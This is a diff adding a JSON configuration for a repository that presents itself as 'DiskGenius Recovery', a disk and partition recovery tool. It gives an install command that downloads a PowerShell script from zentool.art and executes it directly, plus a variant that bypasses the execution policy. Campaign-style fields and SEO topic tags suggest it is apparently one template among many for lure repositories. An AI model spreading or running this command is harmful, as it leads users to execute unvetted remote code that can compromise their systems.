@@ -1,0 +1,29 @@
+{
+  "repo": "DiskGenius-Recovery",
+  "product": "DiskGenius Recovery",
+  "product_title": "DiskGenius Recovery",
+  "kind": "utility",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "backup",
+  "topics": [
+    "diskgenius",
+    "diskgenius-recovery",
+    "data-recovery",
+    "file-recovery",
+    "disk-recovery",
+    "partition-manager",
+    "partition-tools",
+    "disk-management",
+    "hard-drive",
+    "storage-tools",
+    "ntfs",
+    "gpt-disk",
+    "volume-clone"
+  ],
+  "site": "zentool.art"
+}
